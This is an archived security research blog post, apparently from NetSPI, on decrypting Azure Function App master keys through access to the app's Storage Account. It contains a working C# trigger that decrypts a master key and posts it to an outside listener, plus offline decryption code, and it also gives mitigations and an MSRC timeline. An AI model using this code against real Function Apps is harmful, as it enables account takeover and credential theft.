---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-12_what-the-function-decrypting-azure-function-app-keys.md
original_filename: 2023-08-12_what-the-function-decrypting-azure-function-app-keys.md
title: 'What the Function: Decrypting Azure Function App Keys '
category: documents
detected_topics:
- access-control
- api-security
- cloud-security
- supply-chain
- sso
- command-injection
tags:
- imported
- documents
- access-control
- api-security
- cloud-security
- supply-chain
- sso
- command-injection
language: en
raw_sha256: b7f0b3260b47d5a27b15264278e5867ea5ca5f16384e5c1de3b310a07911ddd0
text_sha256: 0cf0498e7719cadd32f0e71564df4b85f6212bf950bf25d329878ecd505c8d54
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# What the Function: Decrypting Azure Function App Keys 

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-12_what-the-function-decrypting-azure-function-app-keys.md
- Source Type: markdown
- Detected Topics: access-control, api-security, cloud-security, supply-chain, sso, command-injection
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `b7f0b3260b47d5a27b15264278e5867ea5ca5f16384e5c1de3b310a07911ddd0`
- Text SHA256: `0cf0498e7719cadd32f0e71564df4b85f6212bf950bf25d329878ecd505c8d54`


## Content

---
title: "What the Function: Decrypting Azure Function App Keys "
page_title: "What the Function: Decrypting Azure Function App Keys"
url: "https://www.netspi.com/blog/technical/cloud-penetration-testing/what-the-function-decrypting-azure-function-app-keys/"
final_url: "https://www.netspi.com/blog/technical-blog/cloud-penetration-testing/what-the-function-decrypting-azure-function-app-keys/"
authors: ["Thomas Elling"]
programs: ["Microsoft (Azure)"]
bugs: ["Cloud"]
publication_date: "2023-08-12"
added_date: "2023-09-05"
source: "pentester.land/writeups.json"
original_index: 861
---

[Technical](/blog/technical-blog/#post-container) / Cloud Pentesting 

# What the Function: Decrypting Azure Function App Keys 

August 12, 2023

### [Thomas Elling,  ](/authors/telling/) ### [Karl Fosaaen  ](/authors/karl-fosaaen/)

  * [](https://www.facebook.com/sharer/sharer.php?u=https://www.netspi.com/blog/technical-blog/cloud-pentesting/what-the-function-decrypting-azure-function-app-keys/)
  * [](https://twitter.com/intent/tweet?text=What the Function: Decrypting Azure Function App Keys &url=https://www.netspi.com/blog/technical-blog/cloud-pentesting/what-the-function-decrypting-azure-function-app-keys/)
  * [](https://www.linkedin.com/shareArticle?mini=true&url=https://www.netspi.com/blog/technical-blog/cloud-pentesting/what-the-function-decrypting-azure-function-app-keys/&title=What the Function: Decrypting Azure Function App Keys )

![What the Function: Decrypting Azure Function App Keys ](https://www.netspi.com/wp-content/uploads/2024/03/Blog-Feature-Images-04.webp)

When deploying an Azure Function App, you’re typically prompted to select a Storage Account to use in support of the application. Access to these supporting Storage Accounts can lead to disclosure of Function App source code, command execution in the Function App, and (as we’ll show in this blog) decryption of the Function App Access Keys.

Azure Function Apps use Access Keys to secure access to HTTP Trigger functions. There are three types of access keys that can be used: function, system, and master (HTTP function endpoints can also be accessed anonymously). The most privileged access key available is the master key, which grants administrative access to the Function App including being able to read and write function source code. 

The master key should be protected and should not be used for regular activities. Gaining access to the master key could lead to supply chain attacks and control of any managed identities assigned to the Function. This blog explores how an attacker can decrypt these access keys if they gain access via the Function App’s corresponding Storage Account. 

## TLDR; 

  * Function App Access Keys can be stored in Storage Account containers in an encrypted format 
  * Access Keys can be decrypted within the Function App container AND offline 
  * Works with Windows or Linux, with any runtime stack 
  * Decryption requires access to the decryption key (stored in an environment variable in the Function container) and the encrypted key material (from host.json). 

## Previous Research 

  * Rogier Dijkman – [Privilege Escalation via storage accounts](https://rogierdijkman.medium.com/privilege-escalation-via-storage-accounts-bca24373cc2e)
  * Roi Nisimi – [From listKeys to Glory: How We Achieved a Subscription Privilege](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)  
[Escalation and RCE by Abusing Azure Storage Account Keys](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)
  * Bill Ben Haim & Zur Ulianitzky – [10 ways of gaining control over Azure function](https://xmcyber.com/blog/10-ways-to-gain-control-over-azure-function-app-sites/)  
[Apps](https://xmcyber.com/blog/10-ways-to-gain-control-over-azure-function-app-sites/)
  * Andy Robbins – [Abusing Azure App Service Managed Identity Assignments](https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95)
  * MSRC – [Best practices regarding Azure Storage Keys, Azure Functions, and Azure Role Based Access](https://msrc.microsoft.com/blog/2023/04/best-practices-regarding-azure-storage-keys-azure-functions-and-azure-role-based-access/)

## Requirements 

Function Apps depend on Storage Accounts at multiple product tiers for code and secret storage. Extensive research has already been done for attacking Functions directly and via the corresponding Storage Accounts for Functions. This blog will focus specifically on key decryption for Function takeover. 

**Required Permissions**

  * Permission to read Storage Account Container blobs, specifically the host.json file (located in Storage Account Containers named “azure-webjobs-secrets”) 
  * Permission to write to Azure File Shares hosting Function code

![Screenshot of Storage Accounts associated with a Function App](https://www.netspi.com/wp-content/uploads/081223_DefCon-Function-App-1.png)

The host.json file contains the encrypted access keys. The encrypted master key is contained in the masterKey.value field.
  
  
  { 
  **"masterKey"** : { 
  "name": "master", 
  **"value"** : "CfDJ8AAAAAAAAAAAAAAAAAAAAA[TRUNCATED]IA", 
  "encrypted": true 
  }, 
  "functionKeys": [ 
  { 
  "name": "default", 
  "value": "CfDJ8AAAAAAAAAAAAAAAAAAAAA[TRUNCATED]8Q", 
  "encrypted": true 
  } 
  ], 
  "systemKeys": [],
  "hostName": "thisisafakefunctionappprobably.azurewebsites.net",
  "instanceId": "dc[TRUNCATED]c3",
  "source": "runtime",
  "decryptionKeyId": "MACHINEKEY_DecryptionKey=op+[TRUNCATED]Z0=;"
  }

The code for the corresponding Function App is stored in Azure File Shares. For what it’s worth, with access to the host.json file, an attacker can technically overwrite existing keys and set the “encrypted” parameter to false, to inject their own cleartext function keys into the Function App (see Rogier Dijkman’s [research](https://rogierdijkman.medium.com/privilege-escalation-via-storage-accounts-bca24373cc2e)). The directory structure for a Windows ASP.NET Function App (thisisnotrealprobably) typically uses the following structure: 

![](https://www.netspi.com/wp-content/uploads/thisisnotrealprobably-1.png)

A new function can be created by adding a new set of folders under the wwwroot folder in the SMB file share. 

![](https://www.netspi.com/wp-content/uploads/thisisnotrealprobably-2.png)

The ability to create a new function trigger by creating folders in the File Share is necessary to either decrypt the key in the function runtime OR return the decryption key by retrieving a specific environment variable. 

## Decryption in the Function container 

Function App Key Decryption is dependent on ASP.NET Core Data Protection. There are multiple references to a specific library for Function Key security in the [Function Host code](https://github.com/Azure/azure-functions-host/blob/dev/src/WebJobs.Script.WebHost/Security/SecretsUtility.cs#L8). 

An old version of this library can be found at <https://github.com/Azure/azure-websites-security>. This library creates a Function specific Azure Data Protector for decryption. The code below has been modified from an [old MSDN post](https://social.msdn.microsoft.com/Forums/Lync/en-US/a4b49641-00f8-4f2a-a4ea-187b87b36e06/decrypt-the-machine-key-from-inside-a-function-app?forum=AzureFunctions) to integrate the library directly into a .NET HTTP trigger. Providing the encrypted master key to the function decrypts the key upon triggering. 

The sample code below can be modified to decrypt the key and then send the key to a publicly available listener. 
  
  
  #r "Newtonsoft.Json" 
  
  **using Microsoft.AspNetCore.DataProtection; 
  using Microsoft.Azure.Web.DataProtection;**
  using System.Net.Http; 
  using System.Text; 
  using System.Net; 
  using Microsoft.AspNetCore.Mvc; 
  using Microsoft.Extensions.Primitives; 
  using Newtonsoft.Json; 
  
  private static HttpClient httpClient = new HttpClient(); 
  
  public static async Task<IActionResult> Run(HttpRequest req, ILogger log) 
  { 
  log.LogInformation("C# HTTP trigger function processed a request."); 
  
  DataProtectionKeyValueConverter converter = new DataProtectionKeyValueConverter(); 
  string keyname = "master"; 
  string encval = "**Cf[TRUNCATED]NQ** "; 
  var ikey = new Key(keyname, encval, true); 
  
  if (ikey.IsEncrypted) 
  { 
  ikey = converter.ReadValue(ikey); 
  } 
  // log.LogInformation(ikey.Value); 
  string url = "**https://[TRUNCATED]** "; 
  string body = $"{{"name":"{keyname}", "value":"{ikey.Value}"}}"; 
  var response = await httpClient.PostAsync(url, new StringContent(body.ToString())); 
  
  string name = req.Query["name"]; 
  
  string requestBody = await new StreamReader(req.Body).ReadToEndAsync(); 
  dynamic data = JsonConvert.DeserializeObject(requestBody); 
  name = name ?? data?.name; 
  
  string responseMessage = string.IsNullOrEmpty(name) 
  ? "This HTTP triggered function executed successfully. Pass a name in the query string or in the request body for a personalized response." 
  : $"Hello, {name}. This HTTP triggered function executed successfully."; 
  
  return new OkObjectResult(responseMessage); 
  } 
  
  class DataProtectionKeyValueConverter 
  { 
  private readonly IDataProtector _dataProtector; 
  
  public DataProtectionKeyValueConverter() 
  { 
  **var provider = DataProtectionProvider.CreateAzureDataProtector(); 
  _dataProtector = provider.CreateProtector("function-secrets");**
  } 
  
  public Key ReadValue(Key key) 
  { 
  var resultKey = new Key(key.Name, null, false); 
  resultKey.Value = _dataProtector.Unprotect(key.Value); 
  return resultKey; 
  } 
  } 
  
  class Key 
  { 
  public Key(){} 
  
  public Key(string name, string value, bool encrypted) 
  { 
  Name = name; 
  Value = value; 
  IsEncrypted = encrypted; 
  } 
  
  [JsonProperty(PropertyName = "name")] 
  public string Name { get; set; } 
  
  [JsonProperty(PropertyName = "value")] 
  public string Value { get; set; } 
  
  [JsonProperty(PropertyName = "encrypted")] 
  public bool IsEncrypted { get; set; }
  }

Triggering via browser: 

![Screenshot of triggering via browser saying This HTTP triggered function executed successfully. Pass a name in the query body for a personalized response. ](https://www.netspi.com/wp-content/uploads/081223_DefCon-Function-App-2.png)

Burp Collaborator:

![Screenshot of Burp collaborator. ](https://www.netspi.com/wp-content/uploads/081223_DefCon-Function-App-3.png)

Master key:

![Screenshot of Master key.](https://www.netspi.com/wp-content/uploads/081223_DefCon-Function-App-4.png)

## Local Decryption 

Decryption can also be done outside of the function container. The <https://github.com/Azure/azure-websites-security> repo contains an older version of the code that can be pulled down and run locally through Visual Studio. However, there is one requirement for running locally and that is access to the decryption key. 

The code makes multiple references to the location of default keys:

  * <https://github.com/Azure/azure-websites-security/blob/master/src/Azure.WebSites.DataProtection/Util.cs#L37>

The [Constants.cs file](https://github.com/Azure/azure-websites-security/blob/master/src/Azure.WebSites.DataProtection/Constants.cs#L13) leads to two environment variables of note: AzureWebEncryptionKey (default) or MACHINEKEY_DecryptionKey. The decryption code defaults to the AzureWebEncryptionKey environment variable. 

One thing to keep in mind is that the environment variable will be different depending on the underlying Function operating system. Linux based containers will use AzureWebEncryptionKey while Windows will use MACHINEKEY_DecryptionKey. One of those environment variables will be available via Function App Trigger Code, regardless of the runtime used. The environment variable values can be returned in the Function by using native code. Example below is for PowerShell in a Windows environment: 
  
  
  $env:MACHINEKEY_DecryptionKey

This can then be returned to the user via an HTTP Trigger response or by having the Function send the value to another endpoint. 

The local decryption can be done once the encrypted key data and the decryption keys are obtained. After pulling down the GitHub repo and getting it setup in Visual Studio, quick decryption can be done directly through an existing test case in DataProtectionProviderTests.cs. The following edits can be made.
  
  
  // Copyright (c) .NET Foundation. All rights reserved. 
  // Licensed under the MIT License. See License.txt in the project root for license information. 
  
  using System; 
  using Microsoft.Azure.Web.DataProtection; 
  using Microsoft.AspNetCore.DataProtection; 
  using Xunit; 
  using System.Diagnostics; 
  using System.IO; 
  
  namespace Microsoft.Azure.Web.DataProtection.Tests 
  { 
  public class DataProtectionProviderTests 
  { 
  [Fact] 
  public void EncryptedValue_CanBeDecrypted()  
  { 
  using (var variables = new TestScopedEnvironmentVariable(Constants.AzureWebsiteLocalEncryptionKey, "**CE[TRUNCATED]1B** ")) 
  { 
  var provider = DataProtectionProvider.CreateAzureDataProtector(null, true); 
  
  var protector = provider.CreateProtector("function-secrets"); 
  
  string expected = "test string"; 
  
  // string encrypted = protector.Protect(expected); 
  string encrypted = "**Cf[TRUNCATED]8w** "; 
  
  string result = protector.Unprotect(encrypted); 
  
  **File.WriteAllText("test.txt", result);**
  Assert.Equal(expected, result); 
  } 
  } 
  } 
  } 

Run the test case after replacing the variable values with the two required items. The test will fail, but the decrypted master key will be returned in test.txt! This can then be used to query the Function App administrative REST APIs. 

## Tool Overview 

NetSPI created a proof-of-concept tool to exploit Function Apps through the connected Storage Account. This tool requires write access to the corresponding File Share where the Function code is stored and supports .NET, PSCore, Python, and Node. Given a Storage Account that is connected to a Function App, the tool will attempt to create a HTTP Trigger (function-specific API key required for access) to return the decryption key and scoped Managed Identity access tokens (if applicable). The tool will also attempt to cleanup any uploaded code once the key and tokens are received. 

Once the encryption key and encrypted function app key are returned, you can use the Function App code included in the repo to decrypt the master key. To make it easier, we’ve provided an ARM template in the repo that will create the decryption Function App for you.

![Screenshot of welcome screen to the NetSPI "FuncoPop" app \(Function App Key Decryption\).](https://www.netspi.com/wp-content/uploads/081223_DefCon-Function-App-5-1024x407.png)

See the GitHub link <https://github.com/NetSPI/FuncoPop> for more info. 

## Prevention and Mitigation 

There are a number of ways to prevent the attack scenarios outlined in this blog and in previous research. The best prevention strategy is treating the corresponding Storage Accounts as an extension of the Function Apps. This includes: 

  1. Limiting the use of Storage Account Shared Access Keys and ensuring that they are not stored in cleartext.
  2. Rotating Shared Access Keys. 
  3. Limiting the creation of privileged, long lasting SAS tokens. 
  4. Use the principle of least privilege. Only grant the least privileges necessary to narrow scopes. Be aware of any roles that grant write access to Storage Accounts (including those roles with list key permissions!) 
  5. Identify Function Apps that use Storage Accounts and ensure that these resources are placed in dedicated Resource Groups.
  6. Avoid using shared Storage Accounts for multiple Functions. 
  7. Ensure that Diagnostic Settings are in place to collect audit and data plane logs. 

More direct methods of mitigation can also be taken such as storing keys in Key Vaults or restricting Storage Accounts to VNETs. See the links below for Microsoft recommendations. 

  * <https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations?tabs=azure-cli#important-considerations>
  * <https://learn.microsoft.com/en-us/azure/azure-functions/functions-networking-options?tabs=azure-cli#restrict-your-storage-account-to-a-virtual-network>
  * <https://learn.microsoft.com/en-us/azure/azure-functions/functions-networking-options?tabs=azure-cli#use-key-vault-references>
  * <https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts?tabs=v4>

## MSRC Timeline 

As part of our standard Azure research process, we ran our findings by MSRC before publishing anything. 

02/08/2023 – Initial report created  
02/13/2023 – Case closed as expected and documented behavior  
03/08/2023 – Second report created  
04/25/2023 – MSRC confirms original assessment as expected and documented behavior  
08/12/2023 – DefCon Cloud Village presentation 

Thanks to [Nick Landers](https://www.netspi.com/author/nick-landers/) for his help/research into ASP.NET Core Data Protection. 

### Authors:

[ ![Headshot of Thomas Elling](https://www.netspi.com/wp-content/uploads/2024/04/Thomas-Elling-1.jpg) Thomas Elling Director, Cloud Pentesting ](/authors/telling)[ ![Headshot of Karl Fosaaen](https://www.netspi.com/wp-content/uploads/2024/04/Karl-Fosaaen_Web-1.jpg) Karl Fosaaen VP, Research ](/authors/karl-fosaaen)

## Explore More Blog Posts

[ ![](https://www.netspi.com/wp-content/uploads/2024/07/072924_TECH_GCPwn_Feature.webp) Cloud Pentesting Bypassing Microsoft Entra Conditional Access Policies via Nested App Authentication  June 22, 2026 Discover how attackers bypassed Microsoft Entra Conditional Access Policies using Nested App Authentication (NAA) flows in this technical vulnerability breakdown. Learn More ](https://www.netspi.com/blog/technical-blog/cloud-pentesting/bypassing-microsoft-entra-conditional-access-policies-via-nested-app-authentication/)[ ![](https://www.netspi.com/wp-content/uploads/2026/06/Feature-Image_Red-Plaid.jpg) Social Engineering I’m Just Asking Questions: Social Engineering as a Reporter  June 17, 2026 Dive into this real-world social engineering assessment where a fake anonymous tip and an adversary-in-the-middle framework tested the limits of an organization's security policies. Learn More ](https://www.netspi.com/blog/technical-blog/social-engineering/im-just-asking-questions-social-engineering-as-a-reporter/)[ ![](https://www.netspi.com/wp-content/uploads/2025/12/TB-Design-6_Feature-Image.png) CISO Perspectives Beyond the Hype: What Regulated Industries Need to Know Before Trusting AI Security Tooling  June 16, 2026 AI security tools can build an attack, but enterprise security teams in regulated industries need consistency, auditability, and predictable costs before they can trust one. Learn why the surrounding infrastructure is where most AI security vendors are still falling short. Learn More ](https://www.netspi.com/blog/executive-blog/ciso-perspectives/beyond-the-hype-what-regulated-industries-need-to-know-before-trusting-ai-security-tooling/)
